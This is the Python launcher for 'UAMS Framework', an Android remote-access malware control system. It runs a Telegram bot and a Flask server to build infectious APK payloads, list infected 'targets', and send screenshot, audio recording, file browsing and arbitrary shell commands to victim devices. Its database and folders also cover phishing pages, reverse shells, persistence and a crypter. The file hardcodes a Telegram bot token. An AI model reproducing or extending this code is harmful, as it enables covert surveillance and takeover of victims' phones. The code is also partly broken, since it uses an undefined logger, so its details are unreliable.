#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
UAMS Framework - Main Entry Point
Unified Attack Management System Launcher
Starts Flask App + Telegram Bot with Auto-Database Initialization
"""

import os
import sys
import logging
import threading
import time
import sqlite3
import json
from datetime import datetime
from pathlib import Path

# ============================================================
# Configuration
# ============================================================

BOT_TOKEN = "8767603081:AAFh4oIHNWjk3kthpFs71J5Daa1d6seKmy4"
ADMIN_USER_ID = 7954796098
SERVER_HOST = "0.0.0.0"
SERVER_PORT = int(os.environ.get('PORT', 5000))
DATABASE_PATH = "backend/database/cybersec.db"

# Global telegram app reference for notifications
telegram_app = None

# ============================================================
# Database Helper Functions
# ============================================================

def get_db_connection():
    """Get database connection"""
    return sqlite3.connect(DATABASE_PATH)

def set_telegram_notifier(app):
    """Set telegram app reference for notifications"""
    global telegram_app
    telegram_app = app

async def notify_admin(message: str):
    """Send notification to admin via Telegram"""
    global telegram_app
    if telegram_app:
        try:
            await telegram_app.bot.send_message(chat_id=ADMIN_USER_ID, text=message, parse_mode='Markdown')
        except Exception as e:
            logger.error(f"Failed to send Telegram notification: {e}")

# ============================================================
# Step 0: Ensure Working Directory is Correct
# ============================================================

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
os.chdir(BASE_DIR)
sys.path.insert(0, BASE_DIR)
logger.info(f"Working directory: {BASE_DIR}")

# ============================================================
# Step 1: Auto-Initialize Database
# ============================================================

def init_database():
    """Create database and all tables if they don't exist"""
    logger.info("Initializing database...")
    
    db_dir = os.path.dirname(DATABASE_PATH)
    os.makedirs(db_dir, exist_ok=True)
    
    try:
        conn = sqlite3.connect(DATABASE_PATH)
        cursor = conn.cursor()
        
        # Create tables
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS payloads (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                name TEXT NOT NULL,
                type TEXT NOT NULL,
                ip_address TEXT,
                port INTEGER,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                file_path TEXT,
                status TEXT DEFAULT 'active',
                notes TEXT
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS landing_pages (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                name TEXT NOT NULL,
                template TEXT NOT NULL,
                payload_id INTEGER,
                url_path TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                visit_count INTEGER DEFAULT 0,
                download_count INTEGER DEFAULT 0,
                FOREIGN KEY (payload_id) REFERENCES payloads (id)
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS c2_sessions (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                session_id TEXT UNIQUE NOT NULL,
                ip_address TEXT NOT NULL,
                port INTEGER,
                device_info TEXT,
                connected_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_seen TIMESTAMP,
                status TEXT DEFAULT 'connected',
                commands_executed INTEGER DEFAULT 0
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                session_id TEXT NOT NULL,
                command TEXT NOT NULL,
                executed_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                result TEXT,
                success BOOLEAN,
                FOREIGN KEY (session_id) REFERENCES c2_sessions (session_id)
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                level TEXT NOT NULL,
                module TEXT NOT NULL,
                message TEXT NOT NULL,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                ip_address TEXT
            )
        ''')
        
        conn.commit()
        conn.close()
        logger.info(f"✓ Database initialized at {DATABASE_PATH}")
        return True
    except Exception as e:
        logger.error(f"Failed to initialize database: {e}")
        return False

# ============================================================
# Step 2: Setup Directories
# ============================================================

def setup_directories():
    """Create all necessary directories"""
    logger.info("Setting up directories...")
    
    directories = [
        'payloads/bind_shell',
        'payloads/reverse_shell',
        'payloads/persistence',
        'builder_engine/templates/base_app',
        'crypter_engine/templates',
        'c2_listener/logs',
        'c2_listener/commands',
        'backend/templates',
        'backend/static',
        'backend/database',
        'web_server/logs',
        'web_server/ssl',
        'output',
        'apk_files',
        'phishing_sites',
        'generated_pages'
    ]
    
    for directory in directories:
        os.makedirs(directory, exist_ok=True)
    
    logger.info("✓ Directories created")

# ============================================================
# Step 3: Create Flask App with Database Integration
# ============================================================

def create_flask_app():
    """Create and configure Flask application"""
    from flask import Flask, render_template, request, jsonify
    from flask_cors import CORS
    
    logger.info("Creating Flask application...")
    
    app = Flask(__name__, 
                template_folder='backend/templates',
                static_folder='backend/static')
    app.secret_key = 'UAMS_SECRET_KEY_2024'
    CORS(app)
    
    @app.route('/')
    def index():
        return jsonify({
            'status': 'online',
            'message': 'UAMS Framework is running',
            'timestamp': datetime.now().isoformat(),
            'bot': 'Telegram Bot Active'
        })
    
    @app.route('/health')
    def health():
        return jsonify({'status': 'healthy', 'database': 'connected'})
    
    logger.info("✓ Flask app created")
    return app

# ============================================================
# Step 4: Initialize Telegram Bot with v20+ Async
# ============================================================

def setup_telegram_bot():
    """Setup and return Telegram bot application with professional UI"""
    from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
    from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

    logger.info("Setting up Telegram Bot v20+ (Professional UI)...")

    app = Application.builder().token(BOT_TOKEN).build()

    # Store telegram app reference for notifications
    global telegram_app
    telegram_app = app

    async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        if user_id != ADMIN_USER_ID:
            await update.message.reply_text("⛔ Unauthorized access denied")
            return

        text = """
🎯 *UAMS C2 Control Center*

✅ *Authentication Verified*
📱 Admin ID: `7954796098`
🖥️ Server: `0.0.0.0:5000`

*Select Operation:*
        """.strip()

        keyboard = [
            [InlineKeyboardButton("🚀 Build Payload", callback_data="build")],
            [InlineKeyboardButton("📱 Targets", callback_data="targets")],
            [InlineKeyboardButton("📂 Files", callback_data="files")],
            [InlineKeyboardButton("⚙️ Settings", callback_data="settings")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)

        if update.message:
            await update.message.reply_text(text, reply_markup=reply_markup, parse_mode='Markdown')
        elif update.callback_query:
            await update.callback_query.edit_message_text(text, reply_markup=reply_markup, parse_mode='Markdown')

    async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        await query.answer()
        data = query.data

        user_id = query.from_user.id
        if user_id != ADMIN_USER_ID:
            await query.edit_message_text("⛔ Unauthorized")
            return

        # Main Menu Handlers
        if data == "main_menu":
            await start_command(update, context)
            return

        elif data == "build":
            await build_menu(update, context)

        elif data == "targets":
            await targets_menu(update, context)

        elif data == "files":
            await files_menu(update, context)

        elif data == "settings":
            await settings_menu(update, context)

        # Build Menu Handlers
        elif data == "build_apk":
            await build_apk_handler(update, context)

        elif data == "build_confirm":
            await build_confirm_handler(update, context)

        # Targets Menu Handlers
        elif data.startswith("device_"):
            device_id = data.replace("device_", "")
            await device_menu(update, context, device_id)

        elif data.startswith("screen_"):
            device_id = data.replace("screen_", "")
            await screen_capture(update, context, device_id)

        elif data.startswith("audio_"):
            device_id = data.replace("audio_", "")
            await audio_capture(update, context, device_id)

        elif data.startswith("browse_"):
            device_id = data.replace("browse_", "")
            await file_browser(update, context, device_id)

        elif data.startswith("terminal_"):
            device_id = data.replace("terminal_", "")
            await terminal_access(update, context, device_id)

        # Settings Handlers
        elif data == "server_status":
            await server_status(update, context)

        elif data == "restart_server":
            await restart_server(update, context)

    # Menu Functions
    async def build_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
        text = """
🔨 *Build Payload*

Choose payload type:
• APK - Android application
• Shell - Reverse shell
• Persistence - Auto-start payload
        """.strip()

        keyboard = [
            [InlineKeyboardButton("📱 APK Payload", callback_data="build_apk")],
            [InlineKeyboardButton("🐚 Reverse Shell", callback_data="build_shell")],
            [InlineKeyboardButton("🔄 Persistence", callback_data="build_persistence")],
            [InlineKeyboardButton("⬅️ Back", callback_data="main_menu")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.callback_query.edit_message_text(text, reply_markup=reply_markup, parse_mode='Markdown')

    async def targets_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
        # Get active sessions from database
        try:
            with get_db_connection() as conn:
                cursor = conn.cursor()
                cursor.execute('SELECT * FROM c2_sessions WHERE status = "active" ORDER BY connected_at DESC')
                sessions = cursor.fetchall()

            if not sessions:
                text = """
📱 *Connected Targets*

❌ No active targets found
                """.strip()
                keyboard = [[InlineKeyboardButton("⬅️ Back", callback_data="main_menu")]]
            else:
                text = f"""
📱 *Connected Targets*

Active devices: {len(sessions)}
                """.strip()

                keyboard = []
                for session in sessions[:10]:  # Limit to 10 devices
                    device_info = json.loads(session['device_info']) if session['device_info'] else {}
                    model = device_info.get('model', 'Unknown')
                    session_short = session['session_id'][:8]
                    keyboard.append([
                        InlineKeyboardButton(
                            f"📱 {model} ({session_short}...)",
                            callback_data=f"device_{session['session_id']}"
                        )
                    ])
                keyboard.append([InlineKeyboardButton("⬅️ Back", callback_data="main_menu")])

            reply_markup = InlineKeyboardMarkup(keyboard)
            await update.callback_query.edit_message_text(text, reply_markup=reply_markup, parse_mode='Markdown')

        except Exception as e:
            logger.error(f"Error getting targets: {e}")
            text = "❌ Error loading targets"
            keyboard = [[InlineKeyboardButton("⬅️ Back", callback_data="main_menu")]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await update.callback_query.edit_message_text(text, reply_markup=reply_markup)

    async def device_menu(update: Update, context: ContextTypes.DEFAULT_TYPE, device_id: str):
        # Get device info
        try:
            with get_db_connection() as conn:
                cursor = conn.cursor()
                cursor.execute('SELECT * FROM c2_sessions WHERE session_id = ?', (device_id,))
                session = cursor.fetchone()

            if session:
                device_info = json.loads(session['device_info']) if session['device_info'] else {}
                model = device_info.get('model', 'Unknown')
                ip = session['ip_address']
                connected_at = session['connected_at']

                text = f"""
🎯 *Device Control*

📱 Model: {model}
🆔 ID: `{device_id[:12]}...`
🌐 IP: {ip}
⏰ Connected: {connected_at}
📊 Status: Active

*Available Actions:*
                """.strip()

                keyboard = [
                    [InlineKeyboardButton("📸 Screen Capture", callback_data=f"screen_{device_id}")],
                    [InlineKeyboardButton("🎙️ Audio Capture", callback_data=f"audio_{device_id}")],
                    [InlineKeyboardButton("📁 File Browser", callback_data=f"browse_{device_id}")],
                    [InlineKeyboardButton("⌨️ Terminal Access", callback_data=f"terminal_{device_id}")],
                    [InlineKeyboardButton("⬅️ Back to Targets", callback_data="targets")]
                ]
                reply_markup = InlineKeyboardMarkup(keyboard)
                await update.callback_query.edit_message_text(text, reply_markup=reply_markup, parse_mode='Markdown')
            else:
                await update.callback_query.edit_message_text("❌ Device not found", parse_mode='Markdown')

        except Exception as e:
            logger.error(f"Error loading device menu: {e}")
            await update.callback_query.edit_message_text("❌ Error loading device", parse_mode='Markdown')

    async def files_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
        text = """
📂 *File Management*

Available operations:
• View generated payloads
• Download files
• Manage storage
        """.strip()

        keyboard = [
            [InlineKeyboardButton("📦 View Payloads", callback_data="view_payloads")],
            [InlineKeyboardButton("⬅️ Back", callback_data="main_menu")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.callback_query.edit_message_text(text, reply_markup=reply_markup, parse_mode='Markdown')

    async def settings_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
        text = """
⚙️ *System Settings*

Server management and configuration
        """.strip()

        keyboard = [
            [InlineKeyboardButton("📊 Server Status", callback_data="server_status")],
            [InlineKeyboardButton("🔄 Restart Server", callback_data="restart_server")],
            [InlineKeyboardButton("⬅️ Back", callback_data="main_menu")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.callback_query.edit_message_text(text, reply_markup=reply_markup, parse_mode='Markdown')

    # Action Handlers
    async def build_apk_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
        text = """
📱 *Build APK Payload*

This will create a new Android payload using the template system.

⚠️ Make sure the server is accessible from target devices.
        """.strip()

        keyboard = [
            [InlineKeyboardButton("✅ Confirm Build", callback_data="build_confirm")],
            [InlineKeyboardButton("⬅️ Back", callback_data="build")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.callback_query.edit_message_text(text, reply_markup=reply_markup, parse_mode='Markdown')

    async def build_confirm_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
        await update.callback_query.edit_message_text("🔨 *Building payload...*\n\nPlease wait...", parse_mode='Markdown')

        try:
            # Import here to avoid circular imports
            import requests

            # Call the API to build payload
            server_url = f"http://localhost:{SERVER_PORT}"
            response = requests.post(f"{server_url}/api/payloads", json={
                "app_name": "UAMS_Payload",
                "server_url": server_url
            }, timeout=30)

            if response.status_code == 200:
                result = response.json()
                if result.get('success'):
                    payload_id = result['payload_id']
                    download_url = f"{server_url}{result['download_url']}"

                    text = f"""
✅ *Payload Built Successfully!*

🆔 Payload ID: `{payload_id}`
📦 File: UAMS_Payload_{payload_id}.apk
🔗 Download: {download_url}

Send this APK to target device for infection.
                    """.strip()

                    keyboard = [
                        [InlineKeyboardButton("📥 Download APK", url=download_url)],
                        [InlineKeyboardButton("⬅️ Back to Menu", callback_data="main_menu")]
                    ]
                    reply_markup = InlineKeyboardMarkup(keyboard)
                    await update.callback_query.edit_message_text(text, reply_markup=reply_markup, parse_mode='Markdown')
                else:
                    await update.callback_query.edit_message_text(f"❌ Build failed: {result.get('error', 'Unknown error')}", parse_mode='Markdown')
            else:
                await update.callback_query.edit_message_text(f"❌ API error: {response.status_code}", parse_mode='Markdown')

        except Exception as e:
            logger.error(f"Build error: {e}")
            await update.callback_query.edit_message_text(f"❌ Build error: {str(e)}", parse_mode='Markdown')

    async def screen_capture(update: Update, context: ContextTypes.DEFAULT_TYPE, device_id: str):
        await update.callback_query.edit_message_text("📸 *Requesting screenshot...*\n\nCommand sent to device.", parse_mode='Markdown')

        try:
            import requests
            server_url = f"http://localhost:{SERVER_PORT}"
            response = requests.post(f"{server_url}/api/sessions/{device_id}/command", json={
                "command": "screenshot"
            })

            if response.status_code == 200:
                await update.callback_query.edit_message_text("📸 Screenshot command sent!\n\nWaiting for device response...", parse_mode='Markdown')
            else:
                await update.callback_query.edit_message_text("❌ Failed to send screenshot command", parse_mode='Markdown')

        except Exception as e:
            logger.error(f"Screenshot error: {e}")
            await update.callback_query.edit_message_text("❌ Error sending screenshot command", parse_mode='Markdown')

    async def audio_capture(update: Update, context: ContextTypes.DEFAULT_TYPE, device_id: str):
        await update.callback_query.edit_message_text("🎙️ *Requesting audio capture...*\n\nCommand sent to device.", parse_mode='Markdown')

        try:
            import requests
            server_url = f"http://localhost:{SERVER_PORT}"
            response = requests.post(f"{server_url}/api/sessions/{device_id}/command", json={
                "command": "audio_capture"
            })

            if response.status_code == 200:
                await update.callback_query.edit_message_text("🎙️ Audio capture command sent!\n\nRecording in progress...", parse_mode='Markdown')
            else:
                await update.callback_query.edit_message_text("❌ Failed to send audio command", parse_mode='Markdown')

        except Exception as e:
            logger.error(f"Audio error: {e}")
            await update.callback_query.edit_message_text("❌ Error sending audio command", parse_mode='Markdown')

    async def file_browser(update: Update, context: ContextTypes.DEFAULT_TYPE, device_id: str):
        await update.callback_query.edit_message_text("📁 *Opening file browser...*\n\nCommand sent to device.", parse_mode='Markdown')

        try:
            import requests
            server_url = f"http://localhost:{SERVER_PORT}"
            response = requests.post(f"{server_url}/api/sessions/{device_id}/command", json={
                "command": "list_files"
            })

            if response.status_code == 200:
                await update.callback_query.edit_message_text("📁 File browser opened!\n\nDevice will send file list...", parse_mode='Markdown')
            else:
                await update.callback_query.edit_message_text("❌ Failed to open file browser", parse_mode='Markdown')

        except Exception as e:
            logger.error(f"File browser error: {e}")
            await update.callback_query.edit_message_text("❌ Error opening file browser", parse_mode='Markdown')

    async def terminal_access(update: Update, context: ContextTypes.DEFAULT_TYPE, device_id: str):
        text = """
⌨️ *Terminal Access*

Enter command to execute on device:
        """.strip()

        # Store device_id in context for next message
        context.user_data['terminal_device'] = device_id

        keyboard = [[InlineKeyboardButton("⬅️ Back", callback_data=f"device_{device_id}")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.callback_query.edit_message_text(text, reply_markup=reply_markup, parse_mode='Markdown')

    async def server_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
        try:
            import requests
            server_url = f"http://localhost:{SERVER_PORT}"
            response = requests.get(f"{server_url}/api/status")

            if response.status_code == 200:
                status = response.json()
                text = f"""
📊 *Server Status*

🖥️ Status: ✅ {status.get('server_status', 'Unknown')}
🗄️ Database: ✅ {status.get('database', 'Unknown')}
🤖 Telegram: ✅ {status.get('telegram_bot', 'Unknown')}
⏰ Time: {status.get('timestamp', 'Unknown')[:19]}
                """.strip()
            else:
                text = f"❌ Server status check failed: {response.status_code}"

        except Exception as e:
            text = f"❌ Cannot connect to server: {str(e)}"

        keyboard = [[InlineKeyboardButton("⬅️ Back", callback_data="settings")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.callback_query.edit_message_text(text, reply_markup=reply_markup, parse_mode='Markdown')

    async def restart_server(update: Update, context: ContextTypes.DEFAULT_TYPE):
        await update.callback_query.edit_message_text("🔄 *Restarting server...*\n\nThis may take a few seconds.", parse_mode='Markdown')

        # In a real implementation, this would restart the server
        # For now, just show a message
        import asyncio
        await asyncio.sleep(2)

        text = """
✅ *Server Restarted*

🔄 System is back online
        """.strip()

        keyboard = [[InlineKeyboardButton("⬅️ Back", callback_data="settings")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.callback_query.edit_message_text(text, reply_markup=reply_markup, parse_mode='Markdown')

    # Message handler for terminal commands
    async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        if user_id != ADMIN_USER_ID:
            return

        device_id = context.user_data.get('terminal_device')
        if device_id and update.message.text:
            command = update.message.text.strip()

            try:
                import requests
                server_url = f"http://localhost:{SERVER_PORT}"
                response = requests.post(f"{server_url}/api/sessions/{device_id}/command", json={
                    "command": command
                })

                if response.status_code == 200:
                    await update.message.reply_text(f"⌨️ Command sent: `{command}`\n\nWaiting for response...", parse_mode='Markdown')
                else:
                    await update.message.reply_text("❌ Failed to send command")

            except Exception as e:
                logger.error(f"Terminal command error: {e}")
                await update.message.reply_text("❌ Error sending command")

            # Clear terminal device
            context.user_data.pop('terminal_device', None)

    # Register handlers
    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CallbackQueryHandler(button_callback))

    # Add message handler for terminal commands
    from telegram.ext import MessageHandler, filters
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    logger.info("✓ Telegram Bot configured with Professional UI")
    return app

# ============================================================
# Step 5: Flask Server Launcher
# ============================================================

def run_flask_app(flask_app):
    """Run Flask API server"""
    logger.info(f"Starting Flask server on {SERVER_HOST}:{SERVER_PORT}...")
    from waitress import serve
    serve(flask_app, host=SERVER_HOST, port=SERVER_PORT, threads=4)

# ============================================================
# Step 6: Main Entry Point
# ============================================================

def main():
    """Main entry point"""
    logger.info("\n" + "="*60)
    logger.info("  UAMS Framework - Initialization Starting")
    logger.info("="*60 + "\n")
    
    # 1. Setup directories
    setup_directories()
    
    # 2. Initialize database
    if not init_database():
        logger.error("Failed to initialize database. Exiting.")
        sys.exit(1)
    
    # 3. Create Flask app
    flask_app = create_flask_app()
    
    # 4. Setup Telegram bot
    telegram_app = setup_telegram_bot()
    
    logger.info("\n" + "="*60)
    logger.info("  ✅ UAMS Framework Ready!")
    logger.info("="*60)
    logger.info(f"\n📊 System Details:")
    logger.info(f"  • Flask API: http://{SERVER_HOST}:{SERVER_PORT}")
    logger.info(f"  • Telegram Bot Token: {BOT_TOKEN[:30]}...")
    logger.info(f"  • Admin ID: {ADMIN_USER_ID}")
    logger.info(f"  • Database: {DATABASE_PATH}")
    logger.info(f"\n[*] Telegram bot is now polling for messages...")
    logger.info(f"[*] Flask server is running on {SERVER_HOST}:{SERVER_PORT}\n")
    
    # 5. Run both Flask and Telegram concurrently
    def run_flask_in_thread():
        try:
            run_flask_app(flask_app)
        except Exception as e:
            logger.error(f"Flask error: {e}")
    
    flask_thread = threading.Thread(target=run_flask_in_thread, daemon=False)
    flask_thread.start()
    
    # Give Flask time to start
    time.sleep(2)
    
    # Run Telegram bot in main thread (blocking)
    try:
        # Simply run the telegram app directly - it manages its own event loop
        logger.info("Starting Telegram Bot...")
        telegram_app.run_polling()
    except KeyboardInterrupt:
        logger.info("\n[!] Shutting down gracefully...")
        sys.exit(0)
    except Exception as e:
        logger.error(f"Telegram bot error: {e}", exc_info=True)
        sys.exit(1)

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        logger.error(f"Fatal error: {e}", exc_info=True)
        sys.exit(1)
